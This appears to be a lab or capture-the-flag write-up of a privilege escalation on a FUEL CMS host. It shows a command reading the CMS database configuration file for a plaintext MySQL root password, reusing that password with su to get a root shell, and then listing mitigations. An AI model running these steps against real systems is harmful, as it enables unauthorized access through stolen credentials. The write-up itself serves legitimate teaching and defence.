## Privilege Escalation Method: Credential Reuse

### Discovery

During post-exploitation, the MySQL root password `mememe` was found in the FUEL CMS configuration file:

```bash
cat /var/www/html/fuel/application/config/database.php
```

### Attempting Password Reuse

Since many administrators reuse passwords across services, we attempted to use the MySQL root password to authenticate as the system root user:

```bash
$ su root
Password: mememe
```

### Root Access Achieved ✅

```bash
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)

# hostname
ubuntu

# pwd
/root
```

## Why This Works

This privilege escalation works because:

1. The FUEL CMS application stores the MySQL root password in plaintext
2. The system administrator reused the same password for the MySQL root account and the system root account
3. This is a common security misconfiguration in development and testing environments

## Mitigation

To prevent this type of privilege escalation:

1. **Never reuse passwords** across different services and accounts
2. **Store credentials securely** - use environment variables or secret management tools instead of hardcoding in config files
3. **Use separate database users** with limited privileges instead of the MySQL root account
4. **Regularly audit configuration files** for exposed credentials
